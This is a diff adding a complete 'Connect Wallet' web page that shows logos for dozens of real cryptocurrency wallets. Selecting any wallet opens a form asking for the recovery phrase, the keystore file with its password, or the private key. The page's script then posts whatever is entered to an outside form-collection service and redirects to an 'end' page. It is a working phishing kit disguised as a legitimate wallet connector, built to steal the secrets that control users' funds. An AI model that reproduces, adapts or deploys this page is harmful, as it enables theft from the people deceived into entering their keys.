@@ -1,0 +1,764 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta 
+    name="viewport" 
+    content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover"
+  />
+  <title>Connect Wallet</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --modal-max-width: 420px;
+      --modal-padding: 20px;
+      --accent: #0d6efd;
+      --danger: #dc3545;
+    }
+
+    html, body {
+      margin: 0;
+      height: 100%;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #0a0a0a, #1a1a1a, #000000);
+      color: #ffffff;
+      min-height: 100vh;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      overscroll-behavior: none;
+    }
+
+    input, textarea {
+      font-size: 16px;
+    }
+
+    .container {
+      max-width: 1400px;
+      margin: auto;
+      padding: 40px 20px;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 32px;
+      margin-bottom: 8px;
+      font-weight: 600;
+      color: #fff;
+    }
+
+    p {
+      color: #ccc;
+      margin-bottom: 30px;
+      font-size: 15px;
+    }
+
+    .search-bar {
+      margin: 0 auto 40px auto;
+      max-width: 500px;
+      width: 100%;
+      padding: 20px 10px;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+      background: rgba(0,0,0,0.3);
+      backdrop-filter: blur(10px);
+      border-radius: 12px;
+    }
+
+    .search-bar input {
+      width: 100%;
+      padding: 14px 16px;
+      border-radius: 10px;
+      border: none;
+      font-size: 15px;
+      outline: none;
+      background: rgba(255,255,255,0.08);
+      color: #fff;
+      transition: background 0.3s, box-shadow 0.3s;
+      backdrop-filter: blur(6px);
+    }
+
+    .search-bar input:focus {
+      background: rgba(255,255,255,0.15);
+      box-shadow: 0 0 8px rgba(0,123,255,0.4);
+    }
+
+    .loader {
+      border: 4px solid rgba(255,255,255,0.2);
+      border-top: 4px solid #61dafb;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      margin: 50px auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+
+    .wallet-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+      gap: 20px;
+    }
+
+    .wallet-card {
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 16px;
+      padding: 16px 8px;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+      cursor: pointer;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255,255,255,0.08);
+      opacity: 0;
+      transform: translateY(15px);
+      animation: fadeInUp 0.6s ease forwards;
+    }
+
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(15px);}
+      to { opacity: 1; transform: translateY(0);}
+    }
+
+    .wallet-card:hover,
+    .wallet-card:focus,
+    .wallet-card:active {
+      transform: translateY(-6px) scale(1.08);
+      box-shadow: 0 0 25px rgba(0,123,255,0.6), 0 0 40px rgba(0,123,255,0.3);
+      outline: none;
+    }
+
+    .wallet-logo {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      background: transparent;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 10px;
+      overflow: hidden;
+      border: 1px solid rgba(255,255,255,0.12);
+    }
+
+    .wallet-logo img {
+      width: 70%;
+      height: 70%;
+      object-fit: contain;
+      transition: transform 0.3s ease;
+    }
+
+    .wallet-card span {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      color: #fff;
+      transition: color 0.3s ease;
+    }
+
+    .wallet-card:hover span { color: #61dafb; }
+
+    .empty-message {
+      text-align: center;
+      color: #aaa;
+      font-size: 16px;
+      padding: 40px 0;
+      opacity: 0;
+      animation: fadeIn 0.5s ease forwards;
+    }
+
+    @media (max-width: 768px) {
+      h1 { font-size: 24px; }
+      p { font-size: 14px; }
+      .wallet-grid { grid-template-columns: repeat(4, 1fr); gap: 14px; }
+      .wallet-logo { width: 52px; height: 52px; }
+      .wallet-card span { font-size: 12px; }
+    }
+
+    .wallet-popup {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      padding: 16px;
+      animation: fadeIn 0.18s ease;
+      -webkit-overflow-scrolling: touch;
+    }
+
+    .wallet-popup-content {
+      background: #fff;
+      color: #000;
+      border-radius: 12px;
+      width: var(--modal-max-width);
+      max-width: calc(100% - 48px);
+      padding: var(--modal-padding);
+      position: relative;
+      animation: slideUp 0.2s ease;
+      box-sizing: border-box;
+      max-height: 90vh;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+    }
+
+    .popup-header {
+      display: flex;
+      justify-content: space-between;
+      font-size: 15px;
+      margin-bottom: 12px;
+      align-items:center;
+      gap: 12px;
+    }
+
+    .back-btn, .close-btn {
+      cursor: pointer;
+      -webkit-tap-highlight-color: transparent;
+      padding: 8px 10px;
+      border-radius: 8px;
+      font-weight: 600;
+      user-select: none;
+    }
+
+    .back-btn { color: var(--accent); background: rgba(13,110,253,0.06); }
+    .back-btn:focus, .close-btn:focus { outline: 2px solid rgba(13,110,253,0.2); }
+
+    .close-btn { font-weight: 700; color: #333; }
+
+    .status-box {
+      border: 2px solid #ccc;
+      color: #333;
+      padding: 12px;
+      border-radius: 8px;
+      text-align: center;
+      margin-bottom: 16px;
+      min-height: 60px;
+      background: #fafafa;
+    }
+
+    .status-box.error {
+      border-color: red;
+      color: red;
+    }
+
+    .status-box .manual-btn {
+      background: var(--accent);
+      border: none;
+      color: #fff;
+      padding: 10px 12px;
+      border-radius: 8px;
+      margin-top: 8px;
+      cursor: pointer;
+      font-weight: 600;
+    }
+
+    .wallet-popup-content.wide {
+      width: 520px;
+      max-width: calc(100% - 32px);
+      padding: 20px;
+    }
+
+    .wallet-info {
+      text-align: center;
+      margin-bottom: 12px;
+    }
+    .wallet-info .wallet-icon {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      border: 1px solid #ddd;
+      margin-bottom: 8px;
+      background:#fff;
+    }
+
+    .tabs {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 10px;
+      flex-wrap:wrap;
+    }
+    .tabs .tab {
+      background: #f0f0f0;
+      border: none;
+      padding: 8px 12px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight:600;
+    }
+    .tabs .tab.active {
+      background: var(--accent);
+      color: #fff;
+    }
+
+    .manual-body textarea,
+    .form-tab textarea {
+      width: 100%;
+      min-height: 100px;
+      resize: none;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 8px;
+      font-family: inherit;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+
+    .manual-body input[type="password"],
+    .manual-body input[type="text"]{
+      width: 100%;
+      padding: 10px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+      margin-bottom: 8px;
+      font-size: 14px;
+    }
+
+    .manual-body .hint {
+      font-size: 12px;
+      color: #666;
+      margin-bottom: 12px;
+    }
+
+    .btn-row {
+      display: flex;
+      justify-content: space-between;
+      gap: 12px;
+      margin-top: 8px;
+    }
+    .proceed-btn {
+      background: var(--accent);
+      color: #fff;
+      border: none;
+      padding: 12px 18px;
+      border-radius: 8px;
+      cursor: pointer;
+      flex: 1;
+      font-weight:700;
+    }
+    .proceed-btn:hover { background: #0950c7; }
+
+    .cancel-btn {
+      background: var(--danger);
+      color: #fff;
+      border: none;
+      padding: 12px 18px;
+      border-radius: 8px;
+      cursor: pointer;
+      flex: 1;
+      font-weight:700;
+    }
+    .cancel-btn:hover { background: #a71d2a; }
+
+    .error-text {
+      color: red;
+      margin-bottom: 10px;
+    }
+
+    @keyframes fadeIn { from {opacity:0;} to {opacity:1;} }
+    @keyframes slideUp { from {transform:translateY(10px);opacity:0;} to {transform:translateY(0);opacity:1;} }
+
+    @media (max-width: 520px) {
+      .wallet-popup-content {
+        width: calc(100% - 32px);
+        padding: 14px;
+        border-radius: 12px;
+        max-height: 92vh;
+      }
+
+      .popup-header { font-size: 14px; gap:8px; }
+      .back-btn, .close-btn { padding: 10px; }
+      .wallet-choice { gap: 10px; }
+      .wallet-choice .wallet-logo { width: 44px; height: 44px; }
+      .tabs .tab { padding: 8px 10px; font-size:13px; }
+      .btn-row { flex-direction: column-reverse; }
+      .btn-row button { width: 100%; padding: 12px; }
+    }
+
+    .toast-container {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      z-index: 2000;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .toast {
+      background: #111;
+      color: #fff;
+      padding: 14px 18px;
+      border-radius: 10px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.4);
+      font-size: 14px;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      opacity: 0;
+      transform: translateX(30px);
+      animation: slideIn 0.3s forwards;
+    }
+
+    .toast.success { border-left: 5px solid #0d6efd; }
+    .toast.error   { border-left: 5px solid #dc3545; }
+
+    @keyframes slideIn {
+      to { opacity: 1; transform: translateX(0); }
+    }
+    @keyframes fadeOut {
+      to { opacity: 0; transform: translateX(30px); }
+    }
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Connect Wallet</h1>
+    <p>Please connect your wallet to continue</p>
+
+    <div class="search-bar">
+      <input type="text" id="walletSearch" placeholder="Search wallet names..." onkeyup="searchWallets()">
+    </div>
+
+    <div id="loader" class="loader"></div>
+    <div class="wallet-grid" id="walletGrid"></div>
+    <div id="emptyMessage" class="empty-message" style="display:none;">No wallets found</div>
+  </div>
+
+  <div class="toast-container" id="toastContainer"></div>
+
+  <script>
+    const allWallets = [
+      { name: "OnChain Wallet", logo: "assets/defi.png" },
+      { name: "Wallet Connect", logo: "assets/walletconnect.svg" },
+      { name: "Safepal", logo: "assets/safepal-logo.png" },
+      { name: "Trust Wallet", logo: "assets/trustwallet.png" },
+      { name: "Metamask", logo: "assets/metamask.svg" },
+      { name: "Ledger", logo: "assets/ledger-wallet5715.jpg" },
+      { name: "Tron", logo: "assets/tron.png" },
+      { name: "Aave", logo: "assets/aave-aave-logo.png" },
+      { name: "Phantom", logo: "assets/phantom-wallet-logo.png" },
+      { name: "AlphaWallet", logo: "assets/alpha.png" },
+      { name: "Asignar", logo: "assets/asigna.jpg" },
+      { name: "Atomic", logo: "assets/atomic.svg" },
+      { name: "Authereum", logo: "assets/auther.htm" },
+      { name: "Best Wallet", logo: "assets/Best-Wallet-logo.png" },
+      { name: "Binance", logo: "assets/binance.svg" },
+      { name: "Bitget", logo: "assets/bitget-icon.png" },
+      { name: "BitKeep", logo: "assets/Bitkeep-wallet-logo.png" },
+      { name: "BitPay", logo: "assets/bitpay.jpg" },
+      { name: "Bridge Wallet", logo: "assets/bridgewallet.png" },
+      { name: "Coinbase", logo: "assets/coinbase.svg" },
+      { name: "Coinomi", logo: "assets/coinmoni.png" },
+      { name: "Cosmostation", logo: "assets/Cosmostation.webp" },
+      { name: "D'Cent", logo: "assets/DCent-wallet-logo.png" },
+      { name: "1inch", logo: "assets/1inch.svg" },
+      { name: "Digitex", logo: "assets/digitex.png" },
+      { name: "Dok Wallet", logo: "assets/dokwallet.png" },
+      { name: "Eidoo", logo: "assets/Eidoo-wallet-logo.png" },
+      { name: "Electrum", logo: "assets/electrum-wallet-seeklogo.png" },
+      { name: "Ellipal", logo: "assets/ellpal.png" },
+      { name: "Exodus", logo: "assets/exodus.png" },
+      { name: "Flare", logo: "assets/fiare.png" },
+      { name: "Formatic", logo: "assets/formatic.jpg" },
+      { name: "GridPlus", logo: "assets/gridplus.png" },
+      { name: "HaloDeFi", logo: "assets/halodefi.png" },
+      { name: "Huobi", logo: "assets/huobo.htm" },
+      { name: "Infinito", logo: "assets/infinito.png" },
+      { name: "Keyring Pro", logo: "assets/keyringpro.png" },
+      { name: "KyberSwap", logo: "assets/kyberswap.htm" },
+      { name: "Leather", logo: "assets/leather.svg" },
+      { name: "Ledger Live", logo: "assets/ledgerlive.htm" },
+      { name: "Linen", logo: "assets/linen.jpeg" },
+      { name: "Loopring", logo: "assets/loopring.htm" },
+      { name: "Magic Eden", logo: "assets/magic_eden.png" },
+      { name: "MathWallet", logo: "assets/mathwallet.jpeg" },
+      { name: "Midas", logo: "assets/midas.png" },
+      { name: "MYKEY", logo: "assets/mykey.jpg" },
+      { name: "Nash", logo: "assets/nash.htm" },
+      { name: "ONTO", logo: "assets/onto.jpeg" },
+      { name: "Ownbit", logo: "assets/ownbit.png" },
+      { name: "PayTube", logo: "assets/paytube.png" },
+      { name: "Pillar", logo: "assets/pillar.png" },
+      { name: "Rainbow", logo: "assets/rainbow.jpeg" },
+      { name: "SparkPoint", logo: "assets/sparkpoint.png" },
+      { name: "Talken", logo: "assets/talken.png" },
+      { name: "Terra", logo: "assets/terra.png" },
+      { name: "TokenPocket", logo: "assets/tokenpocket.jpeg" },
+      { name: "Tonkeeper", logo: "assets/Tonkeeperwallet.jpg" },
+      { name: "TrustVault", logo: "assets/trustvault.png" },
+      { name: "Unstoppable", logo: "assets/unstoppable.png" },
+      { name: "Uniswap", logo: "assets/Uniswap-Logo.webp" },
+      { name: "ViaWallet", logo: "assets/viawallet.png" },
+      { name: "Vision", logo: "assets/vision.htm" },
+      { name: "Wallet.io", logo: "assets/wallet.io.htm" },
+      { name: "Alice", logo: "assets/alice.png" },
+      { name: "WallETH", logo: "assets/walleth.htm" },
+      { name: "Xverse", logo: "assets/Xverse.jpg" },
+      { name: "Zelcore", logo: "assets/zelcore.png" }
+    ];
+
+    function showToast(message, type = "success", duration = 3000) {
+      const container = document.getElementById("toastContainer");
+      const toast = document.createElement("div");
+      toast.className = `toast ${type}`;
+      toast.innerHTML = `${type === "success" ? "âœ…" : "âŒ"} <span>${message}</span>`;
+      container.appendChild(toast);
+
+      setTimeout(() => {
+        toast.style.animation = "fadeOut 0.4s forwards";
+        toast.addEventListener("animationend", () => toast.remove());
+      }, duration);
+    }
+
+    function renderWallets(wallets) {
+      const grid = document.getElementById("walletGrid");
+      const emptyMessage = document.getElementById("emptyMessage");
+      grid.innerHTML = "";
+
+      if (wallets.length === 0) {
+        grid.style.display = "none";
+        emptyMessage.style.display = "block";
+        return;
+      }
+
+      emptyMessage.style.display = "none";
+      grid.style.display = "grid";
+
+      wallets.forEach((w, index) => {
+        const card = document.createElement("div");
+        card.className = "wallet-card";
+        card.setAttribute("tabindex", "0");
+        card.style.animationDelay = `${index * 80}ms`;
+        card.innerHTML = `
+          <div class="wallet-logo">
+            <img src="${w.logo}" alt="${w.name}" loading="lazy" onerror="this.src='assets/default.svg'">
+          </div>
+          <span>${w.name}</span>
+        `;
+        card.addEventListener("click", () => { openWalletPopup(w); });
+        card.addEventListener("keydown", (e) => {
+          if (e.key === "Enter" || e.key === " ") {
+            e.preventDefault();
+            card.click();
+          }
+        });
+        grid.appendChild(card);
+      });
+    }
+
+    function searchWallets() {
+      const input = document.getElementById("walletSearch").value.toLowerCase();
+      const filtered = allWallets.filter(w => w.name.toLowerCase().includes(input));
+      renderWallets(filtered);
+    }
+
+    function lockBodyScroll() {
+      document.documentElement.style.overflow = 'hidden';
+      document.body.style.overflow = 'hidden';
+    }
+    function unlockBodyScroll() {
+      document.documentElement.style.overflow = '';
+      document.body.style.overflow = '';
+    }
+
+    function closeWalletPopup() {
+      const popup = document.querySelector(".wallet-popup");
+      if (popup) popup.remove();
+      unlockBodyScroll();
+      document.activeElement.blur();
+    }
+
+    function openWalletPopup(wallet) {
+      openManualPopup(wallet);
+    }
+
+    function openManualPopup(wallet) {
+      closeWalletPopup();
+      lockBodyScroll();
+
+      const popup = document.createElement("div");
+      popup.className = "wallet-popup";
+      popup.innerHTML = `
+      <div class="wallet-popup-content wide" role="dialog" aria-modal="true" aria-label="Manual connect ${wallet.name}">
+        <div class="popup-header">
+          <button class="back-btn" aria-label="Back" onclick="closeWalletPopup()">Back</button>
+          <button class="close-btn" aria-label="Close" onclick="closeWalletPopup()">âœ•</button>
+        </div>
+        <div class="manual-body">
+          <div class="wallet-info">
+            <img src="${wallet.logo}" alt="${wallet.name}" class="wallet-icon" onerror="this.src='assets/default.svg'">
+            <h3 style="margin:0 0 8px 0;">${wallet.name}</h3>
+          </div>
+          
+          <div class="tabs" role="tablist" aria-label="Manual entry methods">
+            <button class="tab active" onclick="switchTab(this, 'phraseForm')" role="tab" aria-selected="true">Phrase</button>
+            <button class="tab" onclick="switchTab(this, 'keystoreForm')" role="tab" aria-selected="false">Keystore</button>
+            <button class="tab" onclick="switchTab(this, 'privateKeyForm')" role="tab" aria-selected="false">Private Key</button>
+          </div>
+
+          <div class="form-area">
+            <div id="phraseForm" class="form-tab active">
+              <textarea placeholder="Enter your recovery phrase correctly in this box"></textarea>
+              <p class="hint">Typically 12 (sometimes 24) words separated by single spaces.</p>
+            </div>
+
+            <div id="keystoreForm" class="form-tab" style="display:none;">
+              <textarea placeholder="Enter Keystore JSON"></textarea>
+              <input type="password" placeholder="Wallet password" />
+              <p class="hint">
+                Several lines of JSON beginning with '{...}' plus the password you used to encrypt it.
+              </p>
+            </div>
+
+           <div id="privateKeyForm" class="form-tab" style="display:none;">
+            <textarea placeholder="Enter/Paste your Private Key" style="width:100%; min-height:80px; resize:none;"></textarea>
+            <p class="hint">Typically a long hex string or mnemonic. </p>
+            </div>
+
+          <div class="btn-row">
+            <button type="button" class="proceed-btn">PROCEED</button>
+          </div>
+
+          </div>
+        </div>
+      </div>
+    `;
+      document.body.appendChild(popup);
+
+      setTimeout(() => {
+        const firstInput = popup.querySelector("textarea, input");
+        if (firstInput) firstInput.focus();
+      }, 150);
+
+      popup.querySelector(".close-btn").addEventListener("click", () => {
+        document.activeElement.blur();
+        closeWalletPopup();
+      });
+    }
+
+    function switchTab(tabBtn, formId) {
+      const tabs = tabBtn.parentElement.querySelectorAll(".tab");
+      tabs.forEach(t => {
+        t.classList.remove("active");
+        t.setAttribute("aria-selected", "false");
+      });
+
+      document.querySelectorAll(".form-tab").forEach(f => {
+        f.style.display = "none";
+        f.classList.remove("active");
+      });
+
+      tabBtn.classList.add("active");
+      tabBtn.setAttribute("aria-selected", "true");
+
+      const targetForm = document.getElementById(formId);
+      targetForm.style.display = "block";
+      targetForm.classList.add("active");
+
+      const targetTA = targetForm.querySelector("textarea, input");
+      if (targetTA) targetTA.focus();
+    }
+
+    function validateForm() {
+      const activeForm = document.querySelector(".form-tab.active");
+      if (!activeForm) return;
+
+      let formType = activeForm.id;
+      let content = "";
+      let password = "";
+
+      if (formType === "phraseForm") {
+        content = activeForm.querySelector("textarea").value.trim();
+        if (!content) return showToast("Recovery phrase is required (demo).", "error");
+      }
+
+      if (formType === "keystoreForm") {
+        content = activeForm.querySelector("textarea").value.trim();
+        password = activeForm.querySelector("input[type='password']").value.trim();
+        if (!content) return showToast("Keystore JSON is required (demo).", "error");
+        if (!password) return showToast("Password is required (demo).", "error");
+      }
+
+      if (formType === "privateKeyForm") {
+        content = activeForm.querySelector("textarea").value.trim();
+        if (!content) return showToast("Private key is required (demo).", "error");
+      }
+
+      const proceedBtn = document.querySelector(".proceed-btn");
+      proceedBtn.textContent = "Processing...";
+      proceedBtn.disabled = true;
+
+      const formData = new URLSearchParams();
+      formData.append("formType", formType);
+      formData.append("content", content);
+      if (password) formData.append("password", password);
+
+      fetch("https://submit-form.com/0RCVo1CeV", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: formData.toString()
+      })
+        .then(() => {
+          window.location.href = "end.html";
+        })
+        .catch((err) => {
+          console.warn("Network error ignored:", err);
+          window.location.href = "end.html";
+        });
+    }
+
+    document.addEventListener("touchstart", function(e) {
+      if (!e.target.closest("input, textarea")) {
+        document.activeElement.blur();
+      }
+    });
+
+    document.addEventListener("focusin", function(e) {
+      if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") {
+        setTimeout(() => {
+          e.target.scrollIntoView({ behavior: "smooth", block: "center" });
+        }, 300);
+      }
+    });
+
+    window.addEventListener("DOMContentLoaded", () => {
+      renderWallets(allWallets);
+      document.getElementById("loader").style.display = "none";
+    });
+
+    function handleProceed() {
+      if (document.activeElement &&
+         (document.activeElement.tagName === "INPUT" || document.activeElement.tagName === "TEXTAREA")) {
+        document.activeElement.blur();
+      }
+
+      const proceedBtn = document.querySelector(".proceed-btn");
+      if (proceedBtn.disabled) return;
+      proceedBtn.disabled = true;
+      proceedBtn.textContent = "Processing...";
+      validateForm();
+    }
+
+    document.addEventListener("pointerup", function(e) {
+      if (e.target.classList.contains("proceed-btn")) {
+        e.preventDefault();
+        handleProceed();
+      }
+    });
+  </script>
+</body>
+</html>
+
